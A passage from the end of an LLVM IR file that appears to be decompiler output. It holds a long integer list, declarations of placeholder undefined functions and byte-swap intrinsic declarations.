441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 453, 27, 454, 28, 455, 29, 456, 30, 457, 458, 459, 460, 31, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 32, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 33, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 715, 716, 717, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 712, 713, 714, 472, 322, 323, 326, 324, 325, 327, 328, 329, 330, 331, 332, 333, 337, 338, 339, 340, 35, 36, 718 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #0

attributes #0 = { nounwind readnone }
